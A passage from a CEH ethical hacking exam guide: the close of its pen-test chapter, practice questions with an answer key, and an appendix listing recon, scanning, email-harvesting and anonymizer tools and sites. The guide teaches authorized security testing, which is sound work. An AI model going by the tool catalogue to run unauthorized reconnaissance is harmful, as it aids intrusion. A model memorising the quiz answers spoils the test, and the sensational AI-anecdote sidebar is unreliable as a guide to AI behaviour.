move into password cracking and privilege escalation, using a variety of methods we’ve
covered here. Finally, once you’ve gained access, it’s time to execute your attack code.

Finally, the post-attack phase consists of two major steps. First, there’s an awful lot
of cleanup to be done. You’ll need to remove anything that you’ve uploaded to the
organization’s systems in the way of files or folders, and remove any tools, malware,
backdoors, or other attack software you’ve loaded on client systems. And don’t forget the
registry—reset any changes made there to the original settings. The goal of this phase is
to return everything to the pre-test state. Remember, not only are you not supposed to
fix anything you find, but you’re also not supposed to create more vulnerabilities for the
client to deal with: liability to a pen tester doesn’t end just because the test stops.

And the second step in the post-attack phase? Well, that deals with the deliverables,
which we’ll discuss in the next section. Before we do, though, we need to cover a couple
other aspects of pen testing you may not have thought of. Remembering these steps and
guidelines are great, but you may also be required to apply them, and some common
sense, in a scenario on your exam. For example, it’s easy to remember you certainly
wouldn’t do anything before you get an agreement and scope in place, but you might
need to think about what you’d want to do or say before beginning the attack. If you’re
asked to test for weak passwords, should you tell every user about it beforehand so they
have a chance to fix their own before you test? Probably not. What about if you cause
the IDS to go bonkers and alert? Should you stop your test and inform them? Probably
so (continuing to test may interfere with defending against an actual attack), but it really
depends on how far your agreement allows you to go.

And what happens if you find something during a test that shouldn’t be there? When
do you contact the authorities, and do you do so with or without consent of the target
organization? For example, suppose you are performing a pen test on a company’s
environment and you discover a repository of pirated music and videos. Is it your job
to report that? What if it’s Social Security numbers and PII in a location that’s not
protected? How about illegal copies of software? In all of these scenarios, the answer is
definitely no. Even though pirated music, movies, and software are illegal, you have no
means to determine their source, nor any means at your disposal to determine if they
were acquired illegally.

What if what you find, though, does indicate a crime? For example, what if you
discover child pornography on a machine, or an e-mail actively selling PII and credit
card information? In both cases there seems to be no doubt a crime has occurred: U.S.
federal law prohibits the possession of child pornography, and obtaining and using PII in

13-ch13.indd 492 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 13

Chapter 13: The Pen Test: Putting It All Together

493

a way that involves fraud or deception is also prohibited by law. However, each situation
is unique, and your team should have procedures in place to deal with it—procedures
spelled out specifically by the agreement addressing suspected criminal findings.

CAUTION I you stumble across anything illegal, do not copy any o it to your
own devices under any circumstances. In the case o child pornography,
possession itsel is a crime. Again, ethical hacking puts you in strange places,
and you had better have a process deined to handle everything rom
pirated sotware to porn to illegal activity.

Failure to report a crime can oftentimes be considered a crime itself, but if you decide to
play Inspector Clouseau and wind up reporting something on your own, you’re opening
yourself to a world of hurt. Suppose you’re pen testing a company’s systems and find
something you think is criminal in nature and report it, only to see a court say it’s nothing
and throw it out. Now the company will sue you for loss, and you can be charged with
a variety of offenses. While it’s good to know you’re not an officer of the law and it’s not
your job to do their work for them, USC Title 18, Part I, Chapter 1, Section 4, states:
“Whoever, having knowledge of the actual commission of a felony…conceals and does
not as soon as possible make known the same to some judge or other person in civil or
military authority under the United States, shall be fined under this title or imprisoned
not more than three years, or both.” Follow what your team guidance is (make double
sure you have lawyer-approved Rules of Engagement specifically addressing this) and stay
within your agreements.

What’s Artificial About Intelligence?
Artificial intelligence (AI) has long been the stuff of science fiction. But the sen-
tient robots warning Will Robinson of danger or assisting Captain Piccard in going
where no man has gone before don’t seem all that far off anymore. We have versions
of AI everywhere—from Siri in our iPhone to the intelligent braking and driving
systems in our cars. But in our ceaseless quest to make life better for human beings
on this planet, are we actually laying the groundwork for our own demise? I mean,
has anyone seen The Terminator? Doesn’t everyone know what happens when Sky-
net becomes self-aware?

U.S. defense expert Jay Tuck defined AI recently as “software that writes itself,”
and in many ways he’s right. For example, did you hear about Facebook’s foray into
the AI world? They wound up unplugging the system because the two “robots”
began speaking to each other in a new language. Basically the robots determined
English was too slow for them and they had a better way. It took some time for
their human masters to figure out it wasn’t gibberish they were sending to one
another—but a new means of communication. Why? Because nobody told them
they couldn’t.

(continued )

13-ch13.indd 493 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 13

CEH Certified Ethical Hacker All-in-One Exam Guide

494

In a separate case (https://www.newscientist.com/article/2114748-google-translate-
ai-invents-its-own-language-to-translate-with/), Google attempted to improve its
Translate service by adding a neural network, which did indeed make the system
capable of translating much more efficiently, including between language pairs that it
hadn’t been explicitly taught. As the success rate of the network both surprised Google’s
team and was celebrated wildly, quietly in the background there was a bit of a cause for
alarm. Google researchers discovered that while everyone was celebrating the success,
the AI had silently written its own language that’s tailored specifically to the task of
translating sentences.

Look, I could go on and on about AI—the stories out there are endless, and
endlessly fascinating stuff (at least to me)—but I sincerely have to wonder, where’s
it all headed? Shouldn’t we be concerned about all this? I mean, AI might one day
become a better pen tester than all of us combined and put us out of a job, but what
happens when it begins to believe all vulnerabilities must be exploited? Or starts
shutting off systems it determines as suspicious for whatever reason?

Don’t think that can happen? Don’t be naïve—it already is happening all around
us. A recent story on recognition software included a group of researchers who
simply couldn’t understand why their AI software kept saying that a particular dog
was a wolf. After ceaseless reprogrammings and back-and-forths, it was discovered
the software had remembered wolves like/live in snow, and because the image had
snow in it, the decision was made. Wrongly.

I’m not saying we should shut down research and go back to the ’80s in our
computing ability; I’m just wondering aloud what we should do in security to…
well…secure ourselves from what I think anyone with functioning neurons can see
could become a huge problem. I brought up this topic a while back over dinner and
drinks with friends. After some lighthearted back-and-forth, one of the guys looked
off into the distance and said, thoughtfully, “I read somewhere that we already have
human beings that think like machines. They’re called sociopaths.”

Statistical data I read quite a while back says as many as 1 in every 500 people
could be fully sociopathic (although, to be fair, the number is more likely to be in
the 3.6–5 percent range, depending on who you read), surviving (hiding?) due to
therapy, drugs, or good old-fashioned intelligence and the ability to keep themselves
out of the limelight. Would we be able to recognize a sociopathic AI? I don’t know
about you, but the thought I’d even have to start looking for one terrifies me.

Security Assessment Deliverables
I know you’re probably going to hate hearing this, but I have to be truthful with you—
just because you’re an ethical hacker performing security assessments for major clients
doesn’t mean you’re off the hook paperwork-wise. The pen test you were hired to do was
designed with one objective in mind: to provide the client with information they need to

13-ch13.indd 494 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 13

Chapter 13: The Pen Test: Putting It All Together

495

make their network safer and more secure. Therefore, it follows that the client will expect
something in the form of a deliverable in order to take some action—something that
will require you to practice your organizational, typing, and presentation skills. As our
beloved tech editor is fond of saying, “Nobody gives a hoot how good you are at hack-
ing. The only things customers care about are the findings, the impacts, and the analysis
in the report or out-brief. A crappy team with a great report will be seen by customers
as better than a great team with a crappy report.” Fundamentally, you are your report
whether you like it or not, so if you thought you were getting into a paperwork-free, no-
time-behind-the-desk job, my apologies.

Typically your test will begin with some form of an in-brief to the management. This
should provide an introduction of the team members and an overview of the original
agreement. You’ll need to point out which tests will be performed, which team members
will be performing specific tasks, the timeline for your test, and so on. Points of contact,
phone numbers, and other information—including, possibly, the “bat phone” number,
to be called in the event of an emergency requiring all testing to stop—should all be
presented to the client before testing begins. This is a thorough review of all expectations,
for both the test team and the client—nobody leaves until everyone is in agreement and
up to date.

NOTE Some clients and tests will require interim brieings on the progress
o the team. These might be daily wrap-ups the team leader can provide via
secured e-mail or may be ull-blown presentations with all team members
present.

After the test is complete, a comprehensive report is due to the customer. Each test
and client is different, but here are some of the basics that are part of every report:

• An executive summary of the organization’s overall security posture. (If you are
testing under the auspices of FISMA, DIACAP, RMF, HIPAA, or some other
standard, this summary will be tailored to the standard.)

• The names of all participants and the dates of all tests.

• A list of findings, usually presented in order of highest risk.

• An analysis of each finding and recommended mitigation steps (if available).

• Log files and other evidence from your toolset. This evidence should include tons
of screenshots, because that’s what customers seem to want.

For an example of a standard pen test report template, see www.vulnerabilityassessment
.co.uk/report%20template.html.

NOTE Many o the tools we’ve covered in this book have at least some orm
o reporting capability. Otentimes, reports generated by these tools can,
and should, be included with your end-test deliverables.

13-ch13.indd 495 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 13

CEH Certified Ethical Hacker All-in-One Exam Guide

496

Guidelines
Seems like everything in networking and communications births some kind of standard
and an organization to promote it. Pen testing methodology is really a different animal
altogether, since by its very nature it’s not a prime candidate for in-depth standard-
ization. But what about security testing and implementation in general? Absolutely.
And that’s where the Open Source Security Testing Methodology Manual (OSSTMM)
comes into play.

I know, I know—I can hear you screaming across the plains that Open Source doesn’t
indicate a standard, per se. But just hang in there with me, because I’m going somewhere
with this, and it’s something you’ll see referenced at least once on your exam. The
OSSTMM (pronounced “awestem” per the developers) was created by the Institute for
Security and Open Methodologies (ISECOM, https://www.isecom.org) in 2001. It was
started by a group of researchers from various fields as an effort to improve how security
was tested.

The OSSTMM is a peer-reviewed manual of security testing and analysis that
results in fact-based actions that can be taken by an organization to improve security.
Downloadable as a single (although massive) PDF file, the OSSTMM tests legislative,
contractual, and standards-based compliance. Because of the nature of security and its
ever-changing discoveries and needs, the OSSTMM is continually under development,
so keeping up to date with the latest findings is a bonus. Joining the ISECOM-NEWS
list allows you to learn about releases, updates, findings, and all sorts of goodies from the
friendly research staff. Heck, they even have a Facebook page, if you’re so inclined.

Again, the OSSTMM isn’t a pen test–based security testing standard necessarily, but
it does, per the manual, “provide(s) a methodology for a thorough security test, herein
referred to as an OSSTMM audit.” You won’t find EC-Council’s steps clearly defined
in the OSSTMM, but it does provide a pretty thorough look at a security test from
beginning to end. If your organization is starting from scratch, this isn’t a bad place to
start preparing and reading.

And don’t start thinking this is the only one—a simple Internet search for “pen test
methodology” will show that’s not even close to true. Vulnerability Assessment.co.uk (www
.vulnerabilityassessment.co.uk/Penetration%20Test.html) has been promoting a pen test
walkthrough methodology for years. SANS has tons of reading material on the subject
and promotes their own version (https://www.sans.org/white-papers/67/—we introduced
that one earlier). And don’t forget more specialized options: the Open Web Application
Security Project (OWASP) provides security information, including vulnerabilities and
fixes, on web servers and applications for free (https://www.owasp.org/).

More Terminology
As you’re more than aware by now, EC-Council has some interesting terminology for
you to learn along the way. Some of it is useful, but most of it is just for memorization
purposes for your exam—which you can immediately dump out of your neurons as soon
as your test is over. This section, covering the players inside and outside an organization,
is no exception, and I hesitated to even include it in this edition of the book.

13-ch13.indd 496 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 13

Chapter 13: The Pen Test: Putting It All Together

497

You’re already familiar with the disgruntled employee, white hats, black hats, and
the difference between an ethical hacker and a cracker. What you haven’t seen yet is the
crazed, additional terminology categorizing the folks inside and outside the organization
that EC-Council has cooked up for you. The good news is, as of today as I sit here
writing this, I have not seen any of these terms in more than a passing reference in official
courseware or practice exams. The bad news is, they were a big part of earlier versions
of the exam, so I have no real idea if ECC will keep them in or not. In the interest of
covering everything, though, I have to include them.

EC-Council describes four different categories of insider threats, based on the level
of access the employee has: pure insider, insider associate, insider affiliate, and outside
affiliate. The pure insider is the easiest to understand because it’s exactly what it sounds
like: an employee with all the rights and access associated with being employed by the
company. Typically, pure insiders already have access to the facility, with a badge of some
sort, and a logon to get access to the network. One of the biggest problems from a
security perspective with pure insiders isn’t that they exist—after all, your company really
does need people to get the work done—it’s that their privileges are often assigned at a
higher level than are actually required to get their work done.

EXAM TIP Want to get really crazy? Did you know pure insiders can be
urther categorized by their privileges? The term elevated pure insider reers
to an employee that has admin-level privileges to network resources, like a
system administrator or such.

Next up is the insider associate, which refers to someone with limited authorized access,
such as a contractor, guard, or cleaning services person. These folks aren’t employees of
the company, and they certainly do not need or have full access, but they have physical
access to the facility to work. While they’re not allowed network access, the fact they’re
already in the building is a concern for the security professional trying to cover all bases.
Not only are the physical records sometimes accessible, not to mention the plethora
of dumpster-diving material, but physical access to a system usually guarantees that a
hacker, given enough time, can access what she needs.

The third category defined is the insider affiliate, which is more than likely to give you
fits with memorization. An inside affiliate is a spouse, friend, or client of an employee
who uses the employee’s credentials to gain access. The key to this category isn’t the
person carrying out the attack so much as it is the credentials used to do it. For example,
employee Joe’s wife, Mary, isn’t an employee; however, if she’s using Joe’s credentials, for
all intents and purposes she is an insider. To the network, physical access restriction areas,
and any computer she grabs hold of, Mary appears to be Joe, the trusted insider.

EXAM TIP I I were a betting man, I’d be laying down money that you’ll be
asked more about the insider ailiate than any o the other three categories.
Just remember the credentials are what matter. All oicial credentials belong
to the pure insiders, but when used by a person known to the employee,
you’re now dealing with an insider affiliate.

13-ch13.indd 497 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 13

CEH Certified Ethical Hacker All-in-One Exam Guide

498

And finally, the last category is one that should be easy to memorize. The outside
affiliate is someone who is outside the organization, unknown and untrusted, who uses an
open access channel to gain access to an organization’s resources. For example, remember
how much time we spent talking about where you place your wireless access points in
Chapter 7? If you place one in an easily accessible area and don’t secure it properly,
an outside affiliate can gain unauthorized access to your networks and resources. Just
remember, if it’s an employee or someone who knows the employee, it’s an insider—if
it’s not, it’s an outsider.

And so, dear reader, we’ve reached the end of your testable material. I promised I’d
keep this chapter short and to the point, and I believe I have. A lot of the information in
this chapter is a review of items we’ve already discussed, but it’s important to know for
both your exam and your real-world exploits. I sincerely hope I’ve answered most of your
questions and eliminated some of the fear you may have had in tackling this undertaking.

Best of luck to you on both your exam and your future career. Practice what we’ve
talked about here—download and install the tools and try exploits against machines or
VMs you have available in your home lab. And don’t forget to stay ethical! Everything in
this book is intended to help you pass your upcoming exam and become a valued pen test
member, not to teach you to be a hacker. Stay the course and you’ll be fine.

Chapter Review
Security assessments can be one of two types: a security audit (vulnerability assessment)
or a penetration test. A security audit scans and tests a system or network for existing vul-
nerabilities but does not intentionally exploit any of them. This assessment is designed
to uncover potential security holes in the system and report them to the client for their
action. It does not fix or patch vulnerabilities, nor does it exploit them. It only points
them out for the client’s benefit.

A penetration test actively seeks to exploit vulnerabilities encountered on target
systems or networks. This shows the potential consequences of a hacker breaking in
through unpatched vulnerabilities. Penetration tests are carried out by highly skilled
individuals according to an agreement signed before testing begins. This agreement
spells out the limitations, constraints, and liabilities between the organization and the
penetration test team.

Penetration tests consist of two types of assessment: external and internal. An external
assessment analyzes publicly available information and conducts network scanning,
enumeration, and testing from the network perimeter, usually from the Internet. An internal
assessment is performed from within the organization, from various network access points.

Black-box testing occurs when the attacker has no prior knowledge of the infrastructure
at all (your scope is defined, and you’ll be provided the minimal amount of information
required). This testing takes the longest to accomplish and simulates a true outside
hacker. White-box testing simulates an internal user who has complete knowledge of
the company’s infrastructure. Gray-box testing provides limited information on the
infrastructure. Sometimes gray-box testing is born out of a black-box test that determines
more knowledge is needed.

Testing can also be further broken down according to the way it is accomplished.
Automated testing uses an all-inclusive toolset. Automated tools can provide plenty of

13-ch13.indd 498 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 13

Chapter 13: The Pen Test: Putting It All Together

499

information and many legitimate results for a lesser price than manual testing with a
full test team. However, they are also susceptible to false positives and false negatives
and don’t always stop where they’re supposed to (software can’t read your agreement
contract). Manual testing is the best choice for a security assessment. It requires good
planning, design, and scheduling, and it provides the best benefit to the client. Manual
testing is accomplished by a pen test team, following the explicit guidelines laid out
before the assessment.

There are three main phases to a pen test. In the pre-attack phase, reconnaissance and
data-gathering efforts are accomplished. Gathering competitive intelligence, identifying
network ranges, checking network filters for open ports, and so on, are all carried out in
this phase. Running whois, DNS enumeration, finding the network IP address range,
and network scanning are all examples of tasks in this phase.

Attempting to penetrate the network perimeter, acquire targets, execute attacks, and
elevate privileges are steps taken in the attack phase. Verifying ACLs by crafting packets,
checking to see whether you can use any covert tunnels inside the organization, and
using XSS, buffer overflows, and SQL injections are all examples of tasks performed
in this phase. After acquiring specific targets, you’ll move into password cracking and
privilege escalation, using a variety of methods. Finally, once you’ve gained access, it’s
time to execute your attack code.

The post-attack phase consists of two major steps. The first step involves cleaning
up your testing efforts. You need to remove anything that has been uploaded to the
organization’s systems in the way of files or folders, and remove any tools, malware,
backdoors, or other attack software you’ve loaded on the client’s systems. Any registry
changes you’ve made need to be reset to their original settings. The goal of this phase is
to return everything to the pre-test state.

The second step involves writing the pen test report, due after all testing is complete.
The pen test report should contain the following items:

• An executive summary of the organization’s overall security posture. (If you’re
testing under the auspices of FISMA, DIACAP, HIPAA, or some other standard,
this will be tailored to the standard.)

• The names of all participants and the dates of all tests.

• A list of findings, usually presented in order of highest risk.

• An analysis of each finding and the recommended mitigation steps (if available).

• Log files and other evidence from your toolset.

The OSSTMM is a peer-reviewed manual of security testing and analysis that
results in fact-based actions that can be taken by an organization to improve security.
Downloadable as a single (although massive) PDF file, the OSSTMM tests legislative,
contractual, and standards-based compliance.

EC-Council describes four different categories of insider threats, based on the level
of access the employee has. The pure insider (elevated pure insider refers to an employee
that has admin-level privileges to network resources, like a system administrator or such)
is an employee with all the rights and access associated with being employed by the
company. The insider associate refers to someone with limited authorized access, such as

13-ch13.indd 499 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 13

CEH Certified Ethical Hacker All-in-One Exam Guide

500

a contractor, guard, or cleaning services person. The insider affiliate is a spouse, friend,
or client of an employee who uses the employee’s credentials to gain access. The outside
affiliate is someone who is outside the organization, unknown and untrusted, who uses
an open access channel to gain access to an organization’s resources.

Questions
1. A security staff is preparing for a security audit and wants to know if additional

security training for the end user would be beneficial. Which of the following
methods would be the best option for testing the effectiveness of user training in
the environment?
A. Vulnerability scanning
B. Application code reviews
C. Sniffing
D. Social engineering

2. What marks the major difference between a hacker and an ethical hacker (pen test
team member)?
A. Nothing.
B. Ethical hackers never exploit vulnerabilities; they only point out their existence.
C. The tools they use.
D. The predefined scope and agreement made with the system owner.

3. Which of the following best describes a blue team?
A. Security team members defending a network
B. Security team members attacking a network
C. Security team members with full knowledge of the internal network
D. A performance group at Universal Studios in Orlando

4. In which phase of a penetration test is scanning performed?
A. Pre-attack
B. Attack
C. Post-attack
D. Reconnaissance

5. Which type of security assessment notifies the customer of vulnerabilities but
does not actively or intentionally exploit them?
A. Vulnerability assessment
B. Scanning assessment
C. Penetration test
D. None of the above

13-ch13.indd 500 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 13

Chapter 13: The Pen Test: Putting It All Together

501

6. Which of the following would be a good choice for an automated penetration test?
(Choose two.)
A. Nmap
B. Netcat
C. Core Impact
D. CANVAS

7. Which type of testing is generally faster and costs less but is susceptible to more
false reporting and contract violation?
A. Internal
B. External
C. Manual
D. Automatic

8. Joe is part of a penetration test team and is starting a test. The client has provided
him a system on one of their subnets but did not provide any authentication
information, network diagrams, or other notable data concerning the systems.
Which type of test is Joe performing?
A. External, white box
B. External, black box
C. Internal, white box
D. Internal, black box

9. Which of the following would you find in a final report from a full penetration test?
(Choose all that apply.)
A. Executive summary
B. A list of findings from the test
C. The names of all the participants
D. A list of vulnerabilities patched or otherwise mitigated by the team

10. Which type of security assessment is designed to check policies and procedures
within an organization?
A. Security audit
B. Vulnerability assessment
C. Pen test
D. None of the above

11. Which of the following best describes a red team?
A. Security team members defending a network
B. Security team members attacking a network
C. Security team members with full knowledge of the internal network
D. Security team members dedicated to policy audit review

13-ch13.indd 501 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 13

CEH Certified Ethical Hacker All-in-One Exam Guide

502

Answers
1. D. Social engineering is designed to test the human element in the organization.

Of the answers provided, it is the only valid option for testing the effectiveness of
user training.

2. D. Pen tests always begin with an agreement with the customer that identifies
the scope and activities. An ethical hacker will never proceed without written
authorization.

3. A. Blue teams are defense-oriented. They concentrate on preventing and mitigating
attacks and efforts of the red team/bad guys.

4. A. All reconnaissance efforts occur in the pre-attack phase.
5. A. Vulnerability assessments seek to discover open vulnerabilities on the client’s

systems but do not actively or intentionally exploit any of them.
6. C, D. Core Impact and CANVAS are both automated, all-in-one test tool suites

capable of performing a test for a client. Other tools may be used in conjunction
with them to spot vulnerabilities, including Nessus, Retina, SAINT, and Sara.

7. D. Automatic testing involves the use of a tool suite and generally runs faster
than an all-inclusive manual test. However, it is susceptible to false negatives and
false positives and can oftentimes overrun the scope boundary.

8. D. Joe is on a system internal to the network and has no knowledge of the target’s
network. Therefore, he is performing an internal, black-box test.

9. A, B, C. The final report for a pen test includes an executive summary, a list of the
findings (usually in order of highest risk), the names of all participants, analysis of
findings, mitigation recommendations, and any logs or other relevant files.

10. A. A security audit is used to verify security policies and procedures in place.
11. B. Red teams are on offense. They are employed to go on the attack, simulating

the bad guys out in the world trying to exploit anything they can find.

13-ch13.indd 502 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Appendix A

APPENDIX

Tool, Sites, and References A

Greetings, dear reader, and welcome to the best appendix you’ve ever read—or at least
the most useful for your CEH exam anyway. This appendix is filled with links to tools
and websites that will help you become a better ethical hacker. Keep in mind I’m not
providing a recommendation for, an approval of, or a security guarantee on any web-
site or link you’ll find here. Neither I nor my beloved publisher can be held liable for
anything listed here. URLs change, pages become outdated with time, tools become
obsolete when new versions are released, and so on. Not to mention, as I have clearly
pointed out throughout this book, you need to be careful with some of these resources:
your antivirus system will no doubt explode with activity simply by attempting to visit
some of these sites. I highly recommend you create a virtual machine or use a standby
system to download to and test tools from.

These websites and tools are listed here because they will help you in your study
efforts for the exam and further your professional development. I purposely did not
provide tools because it is important that you learn how to find and install what you’re
looking for. You’re entering the big leagues now, so you simply need to know how it’s
really done.

NOTE I you’re trying a link and it doesn’t seem to work, make sure you
give both http:// and https:// a try. Also, don’t be bashul about giving your
avorite search engine a go—as I’ve stated, these links sometimes change
quickly and it’s impossible to keep a written page up to date on them.

Vulnerability Research Sites
• Exploit Database www.exploit-db.com

• Flexera www. flexera.com

• HackerStorm https://hackerstorm.co.uk

• Help Net Security www.net-security.org

503

14-AppA.indd 503 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Appendix A

CEH Certified Ethical Hacker All-in-One Exam Guide

504

• MSVR https://www.microsoft.com/en-us/msrc/technical-security-notifications

• National Vulnerability Database https://nvd.nist.gov

• SC Media www.scmagazine.com

• SecuriTeam https://securiteam.com

• Security Magazine www.securitymagazine.com

• SecurityFocus bugtraq.securityfocus.com

Footprinting Tools
People Search Tools

• 411 www.411.com

• AnyWho www.anywho.com

• Intelius www.intelius.com

• PeekYou www.peekyou.com

• People Search Now www.peoplesearchnow.com

• Sherlock https://github.com/sherlock-project/sherlock

• Social Searcher www.social-searcher.com

• Zabasearch www.zabasearch.com

• ZoomInfo www.zoominfo.com

Competitive Intelligence
• EDGAR www.sec.gov/edgar.shtml

• Euromonitor www.euromonitor.com

• Experian www.experian.com

• Google Finance www.google.com/finance

• MarketWatch www.marketwatch.com

• Semrush www.semrush.com

• Wall Street Transcript www.twst.com

Tracking Online Reputation
• Alexa www.alexa.com

• BrandsEye www.brandseye.com

• Rankur https://rankur.com

• ReputationDefender www.reputationdefender.com

• Social Mention www.socialmention.com.

14-AppA.indd 504 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Appendix A

Appendix A: Tool, Sites, and References

505

Website Research/Web Updates Tools
• InfoMinder www.infominder.com

• Internet Archive https://archive.org

• Netcraft https://news.netcraft.com

• Visualping https://visualping.io

DNS and Whois Tools
• Active Whois www.johnru.com

• ARIN http://whois.arin.net/ui/

• BetterWhois www.betterwhois.com

• DNSstuff www.dnsstuff.com

• Domain Dossier https://centralops.net

• DomainTools www.domaintools.com

• Network Solutions www.networksolutions.com

• Nslookup

• SmartWhois www.tamos.com/products/smartwhois/

• SpyFu www.spyfu.com

• UltraTools Mobile https://www.home.neustar/dns-services/ultra-dns

Geo-Location Tools
• Bing Maps www.bing.com/maps

• GeoIP Lookup https://www.home.neustar/dns-services/ultra-dns

• GeoIP2 www.maxmind.com

• Google Maps www.google.com/maps

• IP Location Finder https://tools.keycdn.com/geo

• IPLocation www.iplocation.net

• Wikimapia https://wikimapia.org

Traceroute Tools and Links
• Path Analyzer Pro www.pathanalyzer.com

• PingPlotter www.pingplotter.com

• Visual IP Trace www.visualiptrace.com

• VisualRoute www.visualroute.com

14-AppA.indd 505 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Appendix A

CEH Certified Ethical Hacker All-in-One Exam Guide

506

Website Mirroring Tools and Sites
• Cyotek WebCopy www.cyotek.com/cyotek-webcopy

• GNU Wget www.gnu.org/software/wget/

• HTTrack www.httrack.com

• NCollector Studio www.calluna-software.com

• Scrapbook www.xuldev.org/scrapbook/

• Website Downloader https://websitedownloader.io/

Operating System Help
• Censys Attack Surface Management (ASM) https://censys.io

• Netcraft https://www.netcraft.com

• Shodan www.shodan.io

Metadata Extraction
• BuzzStream https://tools.buzzstream.com

• ExifTool https://exiftool.org

• ExtractMetadata.com www.extractmetadata.com

• Metagoofil http://www.edge-security.com/metagoofil.php

E-mail Harvesting
• Email Finder https://hunter.io/email-finder

• ScrapeStorm www.scrapestorm.com

• theHarvester www.edge-security.com

E-mail Tracking
• ContactMonkey www.contactmonkey.com

• DidTheyReadIt www.didtheyreadit.com

• eMailTrackerPro www.emailtrackerpro.com

• GetNotify www.getnotify.com

• PoliteMail https://politemail.com

• ReadNotify www.readnotify.com

• Zendio www.zendio.com

Google Hacking
• Google Hacking Database www.exploit-db.com/google-hacking-database

14-AppA.indd 506 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Appendix A

Appendix A: Tool, Sites, and References

507

Scanning and Enumeration Tools
Ping Sweep

• Angry IP Scanner https://angryip.org

• Colasoft Ping Tool https://www.colasoft.com

• Friendly Pinger www.kilievich.com

• MegaPing magnetosoft.com

• Nmap https://nmap.org

• Ping Scanner Pro www.digilextechnologies.com

• Pinkie www.ipuptime.net

• SolarWinds www.solarwinds.com

• Ultra Ping Pro (Multiple download sites)

Scanning Tools
• CurrPorts www.nirsoft.net

• Fing (mobile) www.fing.io/

• Hping2 www.hping.org

• IP Scanner Mobile http://10base-t.com

• MegaPing http://magnetosoft.com

• Netcat http://netcat.sourceforge.net

• NetScanTools Pro www.netscantools.com

• Network Topology Mapper www.solarwinds.com

• Nmap (Zenmap) https://nmap.org/

• NScan http://nscan.hypermart.net/

• PortDroid (mobile) https://portdroid.net/

• PRTG Network Monitor www.paessler.com

Banner Grabbing
• ID Serve www.grc.com

• Netcraft www.netcraft.com

• Telnet

• Xprobe https://sourceforge.net/projects/xprobe/

Vulnerability Scanning
• Acunetix www.acunetix.com

• Core Impact www.coresecurity.com

14-AppA.indd 507 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Appendix A

CEH Certified Ethical Hacker All-in-One Exam Guide

508

• GFI LanGuard www.gfi.com

• MBSA http://technet.microsoft.com

• Nessus www.tenable.com

• Nikto http://cirt.net/nikto2

• OpenVAS www.openvas.org

• Qualys FreeScan www.qualys.com

• Retina http://eeye.com

• Retina for Mobile www.beyondtrust.com

• SAINT http://saintcorporation.com

• SecurityMetrics (mobile) www.securitymetrics.com

• WebInspect https://software.microfocus.com/en-us/products/webinspect-
dynamic-analysis-dast/overview

• Wikto www.sensepost.com

Network Mapping
• HP Network Node Manager www8.hp.com

• IPsonar www.lumeta.com

• LANState www.10-strike.com

• NetMapper www.opnet.com

• NetMaster (mobile) www.nutecapps.com

• Network SAK (mobile) http://foobang.weebly.com

• Network Topology Mapper www.solarwinds.com

• Network View www.networkview.com

• OpManager www.manageengine.com

• Scany (mobile) http://happymagenta.com

Proxy, Anonymizer, and Tunneling
• Anonymizer http://anonymizer.com

• Anonymouse http://anonymouse.org/

• Bitvise www.bitvise.com

• CyberGhost VPN www.cyberghostvpn.com

• G-Zapper www.dummysoftware.com

• HTTP Tunnel www.http-tunnel.com

• NetShade (mobile) www.raynersw.com

• Proxifier www.proxifier.com

• Proxy Browser for Android (mobile) https://play.google.com

14-AppA.indd 508 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Appendix A

Appendix A: Tool, Sites, and References

509

• Proxy Switcher www.proxyswitcher.com

• Proxy Workbench proxyworkbench.com

• ProxyChains http://proxychains.sourceforge.net/

• ProxyDroid (mobile) https://github.com

• Psiphon http://psiphon.ca

• Secure Pipes opoet.com

• Super Network Tunnel www.networktunnel.net

• Tor https://www.torproject.org/

Enumeration
• Hyena www.systemtools.com

• IP Network Browser www.solarwinds.com

• LDAP Admin www.ldapsoft.com

• Ldp.exe www.microsoft.com

• LEX www.ldapexplorer.com

• NetBIOS Enumerator http://nbtenum.sourceforge.net

• Nsauditor www.nsauditor.com

• P0f http://lcamtuf.coredump.cx/p0f.shtml

• PSTools http://technet.microsoft.com

• User2Sid/Sid2User http://windowsecurity.com

• WinFingerprint www.winfingerprint.com

• Xprobe www.sys-security.com/index.php?page=xprobe

SNMP Enumeration
• OpUtils www.manageengine.com

• SNMP Informant www.snmp-informant.com

• SNMP Scanner www.secure-bytes.com

• SNMPUtil www.wtcs.org

• SolarWinds www.solarwinds.com

LDAP Enumeration
• Active Directory Explorer http://technet.microsoft.com

• JXplorer www.jxplorer.org

• LDAP Search http://securityxploded.com

• LEX www.ldapexplorer.com

• Softerra www.ldapadministrator.com

14-AppA.indd 509 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Appendix A

